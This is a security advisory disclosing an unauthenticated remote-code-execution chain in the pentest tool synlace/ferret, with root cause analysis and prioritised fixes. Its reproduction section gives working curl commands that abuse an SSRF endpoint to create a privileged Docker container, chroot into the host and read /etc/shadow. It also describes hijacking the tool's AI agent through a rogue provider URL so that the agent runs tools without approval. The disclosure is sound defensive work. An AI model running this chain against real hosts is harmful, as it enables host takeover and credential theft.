# Unauthenticated remote code execution leading to host compromise in synlace/ferret

**Affected product:** synlace/ferret
**Affected versions:** v1.1.0 (commit `14637b11066ae38b942b4f46d872db02d67839fa`); earlier versions likely affected, not tested.
**Severity:** Critical
**CVSS 3.1:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) — vector network, low complexity, no privileges, no user interaction, scope change (container → host), full impact on confidentiality, integrity, availability.
**CWE:**
- CWE-306 Missing Authentication for Critical Function (API endpoints have no authentication)
- CWE-918 Server-Side Request Forgery (`/api/gnaw/send` proxies arbitrary HTTP)
- CWE-668 Exposure of Resource to Wrong Sphere (docker-socket-proxy reachable from API)
- CWE-732 Incorrect Permission Assignment for Critical Resource (docker-socket-proxy does not body-filter HostConfig)

## Summary

A network attacker who can reach Ferret's API port (`:8000`, bound to `0.0.0.0` by default in `docker-compose.yml`) can achieve root code execution on the host operating system without authentication. The attack chains three issues:

1. **Missing authentication** — every endpoint on the Ferret API is reachable without any credential, token, or session.
2. **Server-side request forgery in `POST /api/gnaw/send`** — the persistent-repeater backend forwards arbitrary attacker-controlled HTTP requests with no destination filter. This allows the attacker to reach `docker-proxy:2375` on the internal Compose network.
3. **Docker-socket-proxy misconfiguration** — `docker-compose.yml` ships `tecnativa/docker-socket-proxy` with `CONTAINERS=1`, `EXEC=1`, and `POST=1`. A comment in the file claims this configuration prevents privileged container creation. It does not. `tecnativa/docker-socket-proxy` is a URL-prefix filter and does not validate request bodies, so `POST /containers/create` is accepted with arbitrary `HostConfig` including `Privileged: true` and `Binds: ["/:/host:rw"]`.

Chained, these issues let an unauthenticated attacker on the same network as the Ferret host create a new privileged container with the host root filesystem bind-mounted, then exec into it to read or modify anything on the host as root.

## Reproduction (live, against v1.1.0)

All requests are unauthenticated POSTs to `:8000`. Reproduced on a fresh `just up` of Ferret v1.1.0 from a separate host on the same LAN. Host VM hostname and `/etc/shadow` content trimmed; `<TARGET>` is the Ferret host's IP.

### Step 1 — confirm unauthenticated reach

```
$ curl -sS -o /dev/null -w "%{http_code}\n" http://<TARGET>:8000/api/projects
200
```

### Step 2 — SSRF probe to docker-proxy

```
$ curl -sS -X POST http://<TARGET>:8000/api/gnaw/send \
  -H 'Content-Type: application/json' \
  -d '{"id":"p1","timestamp":"2026-05-16T00:00:00","method":"GET",
       "host":"docker-proxy","path":"/version",
       "url":"http://docker-proxy:2375/version",
       "headers":{},"body":"","content_length":0}'

{"status_code":200, ..., "response_body":"{\"Version\":\"29.5.0\", ...}"}
```

The Ferret API container forwards the attacker's request to `docker-proxy:2375` on the internal Compose network and returns the response. No URL allowlist, no destination filter.

### Step 3 — list containers (confirms `CONTAINERS=1`, recovers target container name)

```
$ curl -sS -X POST http://<TARGET>:8000/api/gnaw/send \
  -H 'Content-Type: application/json' \
  -d '{"id":"p2","timestamp":"2026-05-16T00:00:00","method":"GET",
       "host":"docker-proxy","path":"/containers/json",
       "url":"http://docker-proxy:2375/containers/json",
       "headers":{},"body":"","content_length":0}'
```

Response lists all running containers including `ferret-api-1`, `ferret-lab`, and cached images. The `ghcr.io/synlace/ferret-lab:latest` image is present on the daemon and reusable.

### Step 4 — create privileged container with host filesystem bind-mounted

```
$ curl -sS -X POST http://<TARGET>:8000/api/gnaw/send \
  -H 'Content-Type: application/json' \
  -d '{"id":"create","timestamp":"2026-05-16T00:00:00","method":"POST",
       "host":"docker-proxy","path":"/containers/create?name=poc-hostroot",
       "url":"http://docker-proxy:2375/containers/create?name=poc-hostroot",
       "headers":{"Content-Type":"application/json"},
       "body":"{\"Image\":\"ghcr.io/synlace/ferret-lab:latest\",\"Cmd\":[\"sleep\",\"3600\"],\"HostConfig\":{\"Binds\":[\"/:/host:rw\"],\"Privileged\":true,\"PidMode\":\"host\"}}",
       "content_length":0}'

{"status_code":201, ..., "response_body":"{\"Id\":\"95caae05...\",\"Warnings\":[]}"}
```

`docker-socket-proxy` accepted `Privileged: true`, `Binds: ["/:/host:rw"]`, and `PidMode: "host"` without filtering. **The "privileged container creation is denied" comment in `docker-compose.yml` is incorrect**; the proxy does not inspect request bodies.

### Step 5 — start the container

```
$ curl -sS -X POST http://<TARGET>:8000/api/gnaw/send \
  -H 'Content-Type: application/json' \
  -d '{"id":"start","timestamp":"2026-05-16T00:00:00","method":"POST",
       "host":"docker-proxy","path":"/containers/poc-hostroot/start",
       "url":"http://docker-proxy:2375/containers/poc-hostroot/start",
       "headers":{},"body":"","content_length":0}'

(204 No Content)
```

### Step 6 — exec `chroot /host` to demonstrate host root

```
$ # create exec
$ curl ... '/containers/poc-hostroot/exec' \
  -d '{... "Cmd":["chroot","/host","sh","-c","id; ls /home; head -3 /etc/shadow"]}'

$ # start exec
$ curl ... '/exec/<EXEC_ID>/start' -d '{"Detach":false,"Tty":false}'

(stream-framed output, demuxed:)
uid=0(root) gid=0(root) groups=0(root)
administrator                 # ← host user, not present in any Ferret container
root:[redacted-real-hash]     # ← host /etc/shadow, only readable by host root
daemon:*:20589:0:99999:7:::
bin:*:20589:0:99999:7:::
```

The output confirms:
- Process is running as `uid=0` on the host (file access perspective).
- `/home/administrator` is the host user directory (no Ferret container has this user).
- `/etc/shadow` contents are the host's, with a real password hash.

Total time from first unauthenticated request to host root: under 2 minutes of HTTP traffic, no operator interaction, no AI provider, no browser.

## Root cause analysis

### 1. No authentication

`src/apps/api/main.py` and all routers under `src/apps/api/routers/` register endpoints without any FastAPI `Depends(...)` auth function. There is no token check, no session cookie, no API key. The `?confirm=destroy` query-string guard on destructive endpoints is a constant in-repo string and provides no security.

### 2. `docker-compose.yml` defaults bind to `0.0.0.0`

```yaml
api:
  ports:
    - "8000:8000"     # binds host 0.0.0.0:8000 → container :8000
    - "1337:1337"
ui:
  ports:
    - "${UI_PORT:-3000}:3000"
```

Short-form `"H:C"` port mappings in Compose bind to `0.0.0.0` on the host. `.env.example` also sets `PROXY_HOST=0.0.0.0`. The README states "Proxy `127.0.0.1:1337`" but the shipped configuration binds publicly. There is no documentation telling operators to switch to `127.0.0.1` bind for LAN-untrusted deployments.

### 3. `POST /api/gnaw/send` is an unfiltered SSRF primitive

`src/apps/api/routers/proxy.py:177` — `send_request()`:

```python
async with httpx.AsyncClient(timeout=30.0, follow_redirects=True, verify=False) as client:
    resp = await client.request(method, url, headers=headers, content=body)
```

The `url` field of the request body has no allowlist, no RFC1918/loopback/link-local check, no scheme check beyond what `httpx` enforces. `follow_redirects=True` additionally allows an attacker-controlled response to redirect into internal services. The same pattern exists in `send_gnaw_tab` and in the `http_request` AI tool (`chats.py:1122`).

### 4. `docker-socket-proxy` configuration is permissive at the body level

`docker-compose.yml`:

```yaml
docker-proxy:
  image: tecnativa/docker-socket-proxy:latest
  environment:
    CONTAINERS: 1   # /containers/*
    EXEC: 1         # /exec/* and POST /containers/*/exec
    POST: 1         # required by create+exec
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock:ro
```

The comment block above this in the file claims that "privileged container creation is denied". This is incorrect. `tecnativa/docker-socket-proxy` is implemented as an HAProxy URL-prefix filter and does not parse or constrain request bodies. With `CONTAINERS=1 POST=1` the endpoint `POST /containers/create` is reachable with any `HostConfig` including `Privileged: true`, `Binds`, `PidMode`, `CapAdd`, and `Devices`.

### 5. Single Docker network

`docker-compose.yml` defines no `networks:` block, so `api`, `ui`, `lab`, and `docker-proxy` all join the default project bridge with full inter-container connectivity. The SSRF in (3) reaches docker-proxy because they are L2-adjacent on the Compose bridge.

## Impact

**Direct, unauthenticated, from any LAN peer of the operator's machine:**

- Host root code execution.
- Read or modify any file on the operator's host: SSH keys, browser profiles, shell histories, project source trees, the operator's home directory.
- Persistence on the host: install a kernel module, drop a systemd unit, modify `/etc/sudoers`.
- Lateral movement: pivot to any other system reachable from the host.

**Specifically for Ferret operators (pentesters):**

- Read `/data/ferret.db` (the SQLite store) which contains all captured `Authorization` headers, `Cookie` values, `Set-Cookie` values, request bodies, response bodies, AI provider API keys (`settings.value` for `ai_api_key` and `ai_provisioning_key`), and per-project provisioned OpenRouter sub-keys (`project_api_keys.key_value`, stored plaintext).
- Read `/data/mitmproxy/mitmproxy-ca.pem` containing the operator's mitmproxy CA private key. The operator has imported the public side of this CA into their browser trust store (per the README's setup instructions). Possession of the private key lets the attacker forge TLS certificates for any host the operator's browser will subsequently trust, until the operator removes the CA from their trust store and re-issues a new one.
- Read every captured request and response from any past or current engagement stored on the operator's machine, including customer PII and credentials the operator captured under NDA.
- Destroy evidence: delete `ferret.db`, wipe findings, corrupt workspaces.

**Threat model context:** Ferret is a pentest tool. Its operators routinely connect their laptops to untrusted networks (client sites, conference Wi-Fi, hotel Wi-Fi). Any peer on those networks who can reach `:8000` on the operator's machine gets host root.

## Affected files / lines (v1.1.0)

- `docker-compose.yml` — port bindings, docker-proxy env, missing `networks:` block.
- `.env.example` — `PROXY_HOST=0.0.0.0` default.
- `src/apps/api/main.py` — no auth dependency on any route.
- `src/apps/api/routers/proxy.py:177` (`send_request`) and `:325` (`send_gnaw_tab`) — `httpx.AsyncClient(verify=False, follow_redirects=True, ...)` with attacker-supplied URL.
- `src/apps/api/routers/setup.py:79` — `POST /api/setup` accepts attacker-supplied `base_url` without scheme/host validation (additional SSRF and AI-provider redirection primitive; see Related Findings).

## Related findings (same disclosure, sub-critical individually but worsen the above)

These do not need to be separately disclosed; reporting them here so the maintainer has the full picture.

- **Stored XSS in Gnaw "Render" view** (`src/apps/ui/app/gnaw/page.tsx:184`): the iframe uses `sandbox="allow-scripts allow-same-origin"` against `srcDoc=response_body`. With `allow-same-origin`, the iframe inherits the parent origin (`http://localhost:3000`), giving any malicious target server XSS-in-the-operator-UI when the operator clicks "Render". CORS allows credentialed requests from that origin to `:8000`, so this becomes a second path to the same chain above. Fix: drop `allow-same-origin` from the iframe sandbox attribute.
- **AI-provider takeover via unauthenticated `POST /api/setup`**: `base_url` is `Optional[str]` with no validation. Setting `base_url` to an attacker-controlled host causes all subsequent chat completions to be sent to that host, leaking the stored OpenRouter sub-key (transmitted as `Authorization: Bearer`) and allowing the attacker's "AI" to return crafted `tool_calls` that execute `run_script` / `pip_install` / `http_request` without operator confirmation. Fix: only allow `base_url` overrides for local providers (ollama / lmstudio) and only accept loopback addresses.
- **No operator confirmation on agent tool calls** (`src/apps/api/routers/chats.py:875`): the AI tool dispatcher executes `run_script`, `pip_install`, `http_request`, etc. without any per-call operator approval. Combined with the AI-provider takeover, this is a second path to RCE. Fix: require client-side approval for destructive-class tool calls.
- **Plaintext credentials at rest**: `project_api_keys.key_value`, `settings.ai_api_key`, `settings.ai_provisioning_key` are stored as plaintext TEXT columns in SQLite. Fix: encrypt at rest with a key derived from a secret held outside `/data/`.
- **Lab container mounts `/data` read-write**: a lab compromise (e.g., via a malicious target server returning crafted content during normal pentest use) gets the credentials DB and the mitmproxy CA private key. Fix: mount only `/data/workspaces` into the lab, not `/data`.
- **WebSocket `/ws` accepts empty `Origin`** (`src/apps/api/main.py:228`): any LAN peer can connect with `wscat` (no `Origin` header) and receive the full real-time stream of captured requests and responses, including headers and bodies. Fix: require a present, allowlisted `Origin`.
- **AI annotation / findings / tests chat endpoints hardcoded to OpenRouter** (`requests.py:158`, `findings.py:114`, `tests.py:207`, `requests.py:327`): if the operator configured a non-OpenRouter provider, these endpoints leak the configured key to OpenRouter as a Bearer token. Fix: route all AI calls through `_build_ai_request` / `get_ai_config`.

## Suggested remediation, in priority order

1. **Network-isolate `docker-proxy`.** Move `docker-proxy` to a private Compose network joined only by `api`. This kills the SSRF path (the API container would still reach docker-proxy, but no other container — and the SSRF endpoint can be additionally guarded as below). Alternatively, drop the docker-socket-proxy entirely and shell out from `api` via a smaller-surface helper.
2. **Restrict `docker-proxy` to specifically the operations Ferret needs.** Ferret only needs `exec` against `ferret-lab`. Either run a body-validating shim in place of `tecnativa/docker-socket-proxy`, or drop `CONTAINERS=1` (and rely on hardcoded container-name resolution).
3. **Add SSRF guards.** In `proxy.py` (`send_request`, `send_gnaw_tab`) and `chats.py` (`http_request` tool): deny RFC1918, link-local, loopback, and Compose service names by default. Set `follow_redirects=False`. Make `verify=False` per-call opt-in.
4. **Add operator authentication.** A token generated at first launch and stored in `~/.config/ferret/token` (mode `0600`) is sufficient for the current single-operator UX without breaking the wizard flow. The UI reads the token from the same file at startup.
5. **Change default port bindings.** `docker-compose.yml` should publish `127.0.0.1:8000:8000`, `127.0.0.1:3000:3000`, `127.0.0.1:1337:1337` by default. `.env.example` should set `PROXY_HOST=127.0.0.1`. Document explicitly that operators who want LAN exposure must override these.
6. **Fix the iframe sandbox.** Drop `allow-same-origin` from `src/apps/ui/app/gnaw/page.tsx:184`. The iframe still renders the HTML preview; it just doesn't inherit the parent origin.
7. **Add operator confirmation for destructive AI tools.** At minimum a first-time-per-session approval for `run_script`, `pip_install`, `http_request`, and `run_ffuf`.
8. **Validate `base_url` in `/api/setup`.** Hardcode allowed hosts per provider for cloud providers; restrict local providers to loopback addresses.
9. **Encrypt credentials at rest.** Use a key stored outside `/data/`.
10. **Stop mounting `/data` into the lab container.** Mount only `/data/workspaces`.

## Notes for the maintainer

The architectural changes in (1) and (2) are the most important. Items (3)–(10) are mitigations that should land regardless, but without (1)/(2) any future feature that exposes outbound HTTP from the API container reopens the same chain.

Most of the rest of the codebase shows careful engineering — CORS lockdown, the `_safe_path` pattern in `workspaces.py`, the docker-socket-proxy *intent*, the README's privacy-conscious tone. The findings here are not negligence; they are the next layer down. I would be glad to review proposed fixes if helpful.
